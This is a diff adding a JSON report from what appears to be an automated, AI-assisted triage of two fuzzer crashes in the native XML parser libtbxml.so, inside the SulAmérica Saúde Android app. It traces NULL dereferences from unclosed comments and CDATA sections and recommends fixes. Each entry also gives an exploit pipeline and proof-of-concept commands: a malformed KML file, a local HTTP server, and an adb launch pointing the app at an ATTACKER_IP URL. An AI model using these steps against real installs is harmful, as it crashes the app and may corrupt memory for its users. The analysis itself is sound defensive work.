@@ -1,0 +1,301 @@
+{
+  "analysis": {
+    "tool": {
+      "model_name": "claude-opus-4-6",
+      "apk_path": "APKs_FINAL/br.com.sulamerica.sam.saude/base.apk",
+      "version": "1.0"
+    },
+    "app": {
+      "app_name": "SulAmérica Saúde",
+      "package": "br.com.sulamerica.sam.saude",
+      "min_sdk": 22,
+      "target_sdk": 31,
+      "version_name": "7.66.0",
+      "version_code": "74040"
+    },
+    "analysisResults": [
+      {
+        "crash": {
+          "ProcessTermination": "strpbrk",
+          "FuzzHarnessEntry": "fuzz_one_input",
+          "ProgramEntry": "main",
+          "StackTrace": [
+            "strpbrk",
+            "decodeBytes",
+            "Java_za_co_twyst_tbxml_TBXML_jniParse",
+            "fuzz_one_input",
+            "main"
+          ],
+          "JNIBridgeMethod": "<za.co.twyst.tbxml.TBXML: jniParse([B)J>",
+          "JavaCallGraph": [
+            "<za.co.twyst.tbxml.TBXML: parse(Ljava/lang/String;)V> -> <plugin.google.maps.PluginKmlOverlay: loadKml(Ljava/lang/String;)Landroid/os/Bundle;> -> <plugin.google.maps.PluginKmlOverlay: access$000(Lplugin/google/maps/PluginKmlOverlay;Ljava/lang/String;)Landroid/os/Bundle;> -> <plugin.google.maps.PluginKmlOverlay$1$1: run()V> -> <za.co.twyst.tbxml.TBXML: jniParse([B)J>"
+          ],
+          "LibMap": {
+            "APKs_FINAL/br.com.sulamerica.sam.saude/lib/arm64-v8a/libtbxml.so": [
+              "strpbrk",
+              "decodeBytes",
+              "Java_za_co_twyst_tbxml_TBXML_jniParse",
+              "Java_za_co_twyst_tbxml_TBXML_jniParse"
+            ]
+          }
+        },
+        "assessment": {
+          "chain_of_thought": [
+            "Step 1: Identify the crash site. The stack trace shows: strpbrk <- decodeBytes <- Java_za_co_twyst_tbxml_TBXML_jniParse <- fuzz_one_input <- main. The crash occurs in strpbrk, called from decodeBytes in libtbxml.so. strpbrk itself is a libc function, so the first application-level frame is decodeBytes.",
+            "Step 2: Analyze Java_za_co_twyst_tbxml_TBXML_jniParse (at 0x0010206c). This JNI function receives a byte array from Java. It calls JNI GetArrayLength (offset 0x558 in JNIEnv), allocates a buffer of (length+1) bytes via calloc, copies the Java byte array into this buffer via GetByteArrayRegion (offset 0x640), then calls decodeBytes on the resulting structure. The byte array content comes directly from the Java caller without any validation.",
+            "Step 3: Analyze decodeBytes (at 0x00101b28). This is an XML parser that operates on the raw byte buffer. It uses strchr, strncmp, strpbrk, strstr, and memcpy extensively to parse XML-like content. Critical observations about NULL pointer handling:",
+            "Step 3a: In decodeBytes, the function calls strchr to find '<' characters. If strchr returns NULL, it returns safely. But then it calls strncmp(pcVar6, '<!--', 4) which is fine if pcVar6 isn't NULL.",
+            "Step 3b: The crash is in strpbrk. Looking at the code, strpbrk is called at two sites in decodeBytes: (1) strpbrk(pcVar8, '<>') at 0x00101cb4 and (2) strpbrk(pcVar7, ' /\\n') at 0x00101d30.",
+            "Step 3c: For the first strpbrk call - pcVar8 starts as pcVar7 (pcVar6+1), and pcVar6 is the result of strchr which is checked for NULL. BUT there's a critical issue: after finding a comment (<!--), the code does pcVar6 = strstr(pcVar6, '-->'), and if strstr returns NULL (malformed XML with unclosed comment), then pcVar6 becomes NULL, and pcVar6+3 is 0x3, then strchr(0x3, '<') will crash or return unpredictable values. BUT actually looking more carefully: strstr returns NULL if '-->' is not found. Then pcVar6 = NULL, and then the code does strchr(pcVar6 + 3, 0x3c) which is strchr(0x3, '<') - accessing invalid memory at address 3, causing a crash.",
+            "Step 3d: Similarly, strpbrk is called with pcVar8 which could be derived from strstr results. If the XML is malformed and strstr('-->') returns NULL after finding a '<!--' sequence, subsequent pointer arithmetic leads to NULL+3, and operations on that invalid pointer cause the crash.",
+            "Step 3e: For the CDATA section handling: if strstr(pcVar6, ']]>') returns NULL (unclosed CDATA), then pcVar7=NULL, and subsequent pointer operations on pcVar7 are undefined behavior.",
+            "Step 4: Trace the data flow backward to Java. In Java: TBXML.parse(String str) calls jniParse(str.getBytes()). The string comes from loadKml which reads from an InputStream that can come from: (a) HTTP URLs - attacker-controlled content from a remote server, (b) local files, (c) Android assets. The URL is provided via a JSONObject 'url' parameter in PluginKmlOverlay.create().",
+            "Step 5: The loadKml method in Java reads the entire file/HTTP response content as a string and passes it to TBXML.parse(). The getKmlContents() method can fetch content from arbitrary HTTP URLs. An attacker who controls a web server can return malicious KML/XML content.",
+            "Step 6: Vulnerability assessment: The decodeBytes function in libtbxml.so has multiple NULL pointer dereference vulnerabilities when processing malformed XML. When the parser encounters malformed XML constructs (unclosed comments '<!--' without '-->', unclosed CDATA sections '<![CDATA[' without ']]>'), the strstr function returns NULL, and subsequent pointer arithmetic on the NULL result leads to accessing invalid memory addresses.",
+            "Step 7: Additionally, the memcpy calls in the CDATA handling section use pointer arithmetic derived from the parsed XML content without adequate bounds checking. The length parameter to memcpy is computed as: ((long)pcVar7 - (long)pcVar6) - 9 and (pcVar8 + offset - 3), which could produce negative/large values with crafted input, leading to heap buffer overflows.",
+            "Step 8: This is a real vulnerability. The input data (XML/KML content) is fully attacker-controlled when fetched from HTTP URLs. The native parser has no bounds checking or NULL checks on return values from strstr. The crash in strpbrk is a symptom of NULL pointer dereference or invalid memory access due to malformed XML input.",
+            "Step 9: Severity assessment: This can cause denial of service (app crash) via crafted KML files. The memcpy operations with computed lengths from attacker-controlled data could potentially lead to memory corruption if the sizes are crafted carefully. The NULL dereference alone is at least a medium severity DoS. The potential heap overflow from memcpy with unchecked sizes could be high severity."
+          ],
+          "is_vulnerable": true,
+          "confidence": 0.92,
+          "reasons": [
+            "The decodeBytes function in libtbxml.so does not check return values of strstr() for NULL when searching for XML comment end ('-->') and CDATA end (']]>') tokens",
+            "When strstr returns NULL for unclosed comments/CDATA, NULL+3 pointer arithmetic leads to invalid memory access causing crash in strpbrk",
+            "Input data (KML/XML content) is fully attacker-controlled via HTTP URL fetching in getKmlContents()",
+            "The memcpy calls in CDATA handling use lengths derived from pointer arithmetic on parsed XML content without bounds validation, risking heap buffer overflow",
+            "The Java layer (TBXML.parse) passes raw user-supplied content bytes to the native parser with no sanitization"
+          ],
+          "cwe_ids": [
+            "CWE-476",
+            "CWE-120",
+            "CWE-787"
+          ],
+          "severity": "high",
+          "affected_libraries": [
+            "libtbxml.so"
+          ],
+          "evidence": [
+            {
+              "function": "decodeBytes",
+              "address": "0x00101b28",
+              "file": "libtbxml.so",
+              "snippet": "pcVar6 = strstr(pcVar6,'-->'); pcVar6 = strchr(pcVar6 + 3, 0x3c); // NULL deref if strstr returns NULL for unclosed comment",
+              "note": "strstr return value not checked for NULL before pointer arithmetic"
+            },
+            {
+              "function": "decodeBytes",
+              "address": "0x00101c50",
+              "file": "libtbxml.so",
+              "snippet": "memcpy(pcVar6, pcVar6+9, ((long)pcVar7-(long)pcVar6)-9); memcpy(local_8, pcVar7+3, ...); // CDATA memcpy with computed lengths from parsed XML",
+              "note": "memcpy lengths derived from XML content pointer arithmetic without bounds checking"
+            },
+            {
+              "function": "Java_za_co_twyst_tbxml_TBXML_jniParse",
+              "address": "0x0010206c",
+              "file": "libtbxml.so",
+              "snippet": "iVar1 = GetArrayLength(param_1,param_3); pvVar3 = calloc(1,(long)(iVar1+1)); GetByteArrayRegion(param_1,param_3,0,iVar1,pvVar3); decodeBytes(puVar2);",
+              "note": "JNI entry point passes raw byte array content to decodeBytes without validation"
+            },
+            {
+              "function": "loadKml",
+              "file": "PluginKmlOverlay.java",
+              "snippet": "InputStream kmlContents = getKmlContents(str); ... tbxml.parse(sb.toString());",
+              "note": "Java reads content from HTTP URL or file and passes directly to native XML parser"
+            },
+            {
+              "function": "getKmlContents",
+              "file": "PluginKmlOverlay.java",
+              "snippet": "URL url = new URL(str); httpURLConnection = (HttpURLConnection) url.openConnection(); ... return Callback.getInputStream(httpURLConnection);",
+              "note": "Content fetched from attacker-controlled HTTP URL without content validation"
+            }
+          ],
+          "call_sequence": [
+            "PluginKmlOverlay.create() -> PluginKmlOverlay$1$1.run() -> PluginKmlOverlay.loadKml() -> TBXML.parse() -> TBXML.jniParse(byte[]) -> Java_za_co_twyst_tbxml_TBXML_jniParse @ 0x0010206c -> decodeBytes @ 0x00101b28 -> strpbrk (crash)"
+          ],
+          "recommendations": [
+            "Add NULL checks for all strstr() and strchr() return values in decodeBytes before performing pointer arithmetic",
+            "Add bounds validation for memcpy length parameters computed from XML content pointers",
+            "Consider replacing the custom native XML parser with a well-tested XML parsing library",
+            "Add input sanitization or length limits in the Java layer before passing content to native code"
+          ],
+          "assumptions": [
+            "The fuzzer is providing malformed XML/KML content that triggers unclosed comment or CDATA sections",
+            "The strpbrk crash is a consequence of NULL pointer dereference from prior strstr returning NULL",
+            "The app's Cordova plugin architecture allows external content URLs to be specified by web content"
+          ],
+          "limitations": [
+            "Cannot confirm the exact malformed XML input that triggered the crash without the fuzzer corpus",
+            "Heap overflow exploitability via memcpy depends on exact heap layout which was not analyzed",
+            "The precise crash instruction within strpbrk was not available to confirm NULL vs other invalid pointer"
+          ],
+          "exploit": {
+            "exploitability": "practical",
+            "trigger_method": "Serve a malicious KML file via HTTP with unclosed XML comments (<!-- without -->) or unclosed CDATA sections (<![CDATA[ without ]]>) to trigger NULL pointer dereference in native XML parser",
+            "prerequisites": [
+              "Attacker controls a web server that serves malicious KML content",
+              "App must be triggered to load a KML overlay pointing to the attacker's URL",
+              "The PluginKmlOverlay.create() must be invoked with the attacker-controlled URL"
+            ],
+            "exploit_pipeline": [
+              "1. Set up an HTTP server serving a malicious KML file with an unclosed XML comment: '<kml><!-- no closing comment tag <Placemark></Placemark></kml>'",
+              "2. Trigger the PluginKmlOverlay.create() method via Cordova plugin execution with the malicious URL",
+              "3. The app fetches the KML content, passes it to TBXML.parse() which calls jniParse()",
+              "4. In native decodeBytes, strstr('-->') returns NULL for the unclosed comment, NULL+3 causes invalid memory access in subsequent strpbrk/strchr calls",
+              "5. App crashes with SIGSEGV (DoS), or with crafted CDATA sections, the memcpy with unvalidated lengths may corrupt heap memory"
+            ],
+            "poc_commands": [
+              "echo '<kml><!-- unclosed comment <Placemark><name>test</name></Placemark></kml>' > /tmp/malicious.kml",
+              "python3 -m http.server 8080 --directory /tmp/",
+              "adb shell am start -n br.com.sulamerica.sam.saude/br.com.sulamerica.sam.saude.MainActivity --es url 'http://ATTACKER_IP:8080/malicious.kml'"
+            ],
+            "poc_files": [
+              "/tmp/malicious.kml"
+            ],
+            "notes": "The most reliable trigger is an unclosed XML comment which causes strstr to return NULL. CDATA-based exploitation for heap corruption requires more precise payload crafting but is theoretically possible due to the unchecked memcpy lengths."
+          }
+        },
+        "statistics": {
+          "time": "00:03:39",
+          "llm_requests": 44,
+          "llm_tool_calls": 54,
+          "input_tokens": 1555278,
+          "output_tokens": 5666
+        }
+      },
+      {
+        "crash": {
+          "ProcessTermination": "strchr_default",
+          "FuzzHarnessEntry": "fuzz_one_input",
+          "ProgramEntry": "main",
+          "StackTrace": [
+            "strchr_default",
+            "decodeBytes",
+            "Java_za_co_twyst_tbxml_TBXML_jniParse",
+            "fuzz_one_input",
+            "main"
+          ],
+          "JNIBridgeMethod": "<za.co.twyst.tbxml.TBXML: jniParse([B)J>",
+          "JavaCallGraph": [
+            "<za.co.twyst.tbxml.TBXML: parse(Ljava/lang/String;)V> -> <plugin.google.maps.PluginKmlOverlay: loadKml(Ljava/lang/String;)Landroid/os/Bundle;> -> <plugin.google.maps.PluginKmlOverlay: access$000(Lplugin/google/maps/PluginKmlOverlay;Ljava/lang/String;)Landroid/os/Bundle;> -> <plugin.google.maps.PluginKmlOverlay$1$1: run()V> -> <za.co.twyst.tbxml.TBXML: jniParse([B)J>"
+          ],
+          "LibMap": {
+            "APKs_FINAL/br.com.sulamerica.sam.saude/lib/arm64-v8a/libtbxml.so": [
+              "decodeBytes",
+              "Java_za_co_twyst_tbxml_TBXML_jniParse",
+              "Java_za_co_twyst_tbxml_TBXML_jniParse"
+            ]
+          }
+        },
+        "assessment": {
+          "chain_of_thought": [
+            "Step 1: Identify the crash site. The crash is in strchr_default, called from decodeBytes at 0x00101b28, called from Java_za_co_twyst_tbxml_TBXML_jniParse at 0x0010206c. The crash is in libtbxml.so, a native XML parsing library.",
+            "Step 2: Analyze Java_za_co_twyst_tbxml_TBXML_jniParse. This JNI function receives a byte array from Java. It calls JNI GetArrayLength (offset 0x558), allocates a buffer of length+1 via calloc, copies the Java byte array into the native buffer via GetByteArrayRegion (offset 0x640), then calls decodeBytes(puVar2) to parse the XML.",
+            "Step 3: Analyze decodeBytes at 0x00101b28. This function takes the document structure and parses the XML buffer. It starts by calling strchr(local_8, 0x3c) to find '<' characters. The key vulnerability is in how it handles XML comments and CDATA sections.",
+            "Step 4: Identify the specific crash path. In the comment handling block: pcVar6 = strstr(pcVar6, '-->'); then pcVar6 = strchr(pcVar6 + 3, 0x3c). If strstr returns NULL (i.e., the comment is never closed), then pcVar6 is NULL, and pcVar6 + 3 = 0x3 is passed to strchr. strchr(0x3, 0x3c) will crash with SIGSEGV because it dereferences an invalid near-null pointer.",
+            "Step 5: Similarly, in CDATA handling: pcVar7 = strstr(pcVar6, ']]>'), and if not found, pcVar7 is NULL. Then pcVar8 = strchr(pcVar7, 0x3c) passes NULL to strchr, or pcVar8 = strchr(pcVar8, 0x3c) where pcVar8 is after strstr that returned NULL.",
+            "Step 6: Backward data-flow analysis. The buffer parsed by decodeBytes comes directly from the byte array passed from Java. In Java, TBXML.parse(String str) calls jniParse(str.getBytes()). The string comes from loadKml() which reads content from a URL or file.",
+            "Step 7: Java call graph analysis. The call chain is: PluginKmlOverlay.create() -> PluginKmlOverlay.loadKml(String) -> TBXML.parse(String) -> TBXML.jniParse(byte[]). The loadKml method fetches content from a URL provided in JSON arguments. The URL can be an HTTP URL, and the content is read as-is without sanitization before being passed to the native XML parser.",
+            "Step 8: Attacker control assessment. The KML content fetched from the URL is entirely attacker-controlled if the URL points to an attacker's server (SSRF-like, or if the app loads untrusted KML). Even for local files, malformed KML content triggers the crash. The byte array content directly becomes the buffer parsed by decodeBytes.",
+            "Step 9: The null pointer dereference in strchr is caused by unchecked return values of strstr() in the decodeBytes function. When parsing malformed XML with unclosed comments (<!-- without -->) or unclosed CDATA sections (<![CDATA[ without ]]>), strstr returns NULL and the code proceeds to use it without null checks, adding offsets and passing to strchr.",
+            "Step 10: Exploitability. This is a null pointer dereference (reading from address ~0x3 in the comment case). On most systems this results in a crash/DoS. It's not directly exploitable for code execution on modern systems with null page protections, but it's a reliable denial of service. The trigger is straightforward: provide malformed XML with an unclosed comment.",
+            "Step 11: Reachability. The PluginKmlOverlay.create() method is exposed as a Cordova plugin action. It can be triggered by JavaScript in the WebView, which loads a KML URL. If the KML content is attacker-controlled (e.g., from an external HTTP URL), the crash is easily triggered."
+          ],
+          "is_vulnerable": true,
+          "confidence": 0.92,
+          "reasons": [
+            "The decodeBytes function in libtbxml.so does not check the return value of strstr() before using the result, leading to a null pointer dereference in strchr when parsing malformed XML.",
+            "Specifically, when an XML comment '<!--' is found but no closing '-->' exists, strstr returns NULL, and the code does (NULL + 3) then passes that to strchr, crashing.",
+            "The input buffer comes directly from attacker-controllable KML content fetched via HTTP URL or local file, with no validation or sanitization before native parsing.",
+            "The Java call chain shows this is reachable through the PluginKmlOverlay Cordova plugin, which can load KML from arbitrary URLs."
+          ],
+          "cwe_ids": [
+            "CWE-476"
+          ],
+          "severity": "medium",
+          "affected_libraries": [
+            "libtbxml.so"
+          ],
+          "evidence": [
+            {
+              "function": "decodeBytes",
+              "address": "0x00101b28",
+              "file": "libtbxml.so",
+              "snippet": "pcVar6 = strstr(pcVar6,\"-->\"); pcVar6 = strchr(pcVar6 + 3, 0x3c); // No null check on strstr result",
+              "note": "If strstr returns NULL (unclosed comment), strchr receives 0x3 as pointer, causing SIGSEGV"
+            },
+            {
+              "function": "Java_za_co_twyst_tbxml_TBXML_jniParse",
+              "address": "0x0010206c",
+              "file": "libtbxml.so",
+              "snippet": "iVar1 = (**(code **)(*param_1 + 0x558))(param_1,param_3); pvVar3 = calloc(1,(long)(iVar1 + 1)); (*pcVar5)(param_1,param_3,0,iVar1,pvVar3); decodeBytes(puVar2);",
+              "note": "JNI entry: copies Java byte array directly into native buffer, then passes to decodeBytes without content validation"
+            },
+            {
+              "function": "parse",
+              "file": "za.co.twyst.tbxml.TBXML",
+              "snippet": "public void parse(String str) throws TBXMLException { jniFree(this.document); long jJniParse = jniParse(str.getBytes()); }",
+              "note": "Java side passes raw string bytes to native parser with no sanitization"
+            },
+            {
+              "function": "loadKml",
+              "file": "plugin.google.maps.PluginKmlOverlay",
+              "snippet": "tbxml.parse(sb.toString()); // sb is content from HTTP URL or file",
+              "note": "KML content from potentially attacker-controlled URL is passed directly to native parser"
+            }
+          ],
+          "call_sequence": [
+            "PluginKmlOverlay.create() -> PluginKmlOverlay$1$1.run()",
+            "PluginKmlOverlay.loadKml(String) -> TBXML.parse(String)",
+            "TBXML.parse(String) -> TBXML.jniParse(byte[])",
+            "Java_za_co_twyst_tbxml_TBXML_jniParse @ 0x0010206c -> decodeBytes @ 0x00101b28",
+            "decodeBytes @ 0x00101b28 -> strstr @ 0x00100fc0 (returns NULL for unclosed comment)",
+            "decodeBytes @ 0x00101b28 -> strchr @ 0x00100f80 (crashes on NULL+3 pointer)"
+          ],
+          "recommendations": [
+            "Add null checks after every strstr() call in decodeBytes before using the returned pointer",
+            "Validate XML structure minimally before passing to native parser, or use a memory-safe XML parser",
+            "Consider replacing libtbxml with a well-maintained XML parsing library that handles malformed input gracefully"
+          ],
+          "assumptions": [
+            "The fuzzer generated malformed XML with an unclosed comment or CDATA section",
+            "The PluginKmlOverlay plugin is reachable through the Cordova JavaScript bridge in production"
+          ],
+          "limitations": [
+            "Cannot confirm exact crashing input without fuzzer corpus",
+            "Cannot fully assess whether the Cordova plugin is exposed to external JavaScript or only internal WebView content"
+          ],
+          "exploit": {
+            "exploitability": "practical",
+            "trigger_method": "Supply malformed KML/XML content with unclosed HTML comment (e.g., '<!-- no closing tag') via a URL loaded by the PluginKmlOverlay Cordova plugin",
+            "prerequisites": [
+              "Ability to serve or provide a malformed KML file accessible to the app",
+              "The KML overlay plugin must be triggered (e.g., via JavaScript in the Cordova WebView)"
+            ],
+            "exploit_pipeline": [
+              "1. Host a malformed KML file containing '<!-- unclosed comment' on an attacker-controlled HTTP server",
+              "2. Trigger the PluginKmlOverlay.create() method via JavaScript with the URL pointing to the malicious KML",
+              "3. The app fetches and passes the KML content to libtbxml.so's native parser",
+              "4. decodeBytes encounters the unclosed comment, strstr returns NULL, strchr dereferences near-null pointer causing SIGSEGV and app crash"
+            ],
+            "poc_commands": [
+              "echo '<?xml version=\"1.0\"?><kml><!-- unclosed comment <Placemark><name>test</name></Placemark></kml>' > /tmp/crash.kml",
+              "python3 -m http.server 8080 --directory /tmp/",
+              "adb shell am start -n br.com.sulamerica.sam.saude/.MainActivity"
+            ],
+            "poc_files": [
+              "/tmp/crash.kml"
+            ],
+            "notes": "The crash is a reliable DoS. The null pointer dereference at address ~0x3 is not exploitable for code execution on modern Android due to null page protections, but causes immediate app termination."
+          }
+        },
+        "statistics": {
+          "time": "00:02:05",
+          "llm_requests": 22,
+          "llm_tool_calls": 31,
+          "input_tokens": 894278,
+          "output_tokens": 4095
+        }
+      }
+    ]
+  }
+}
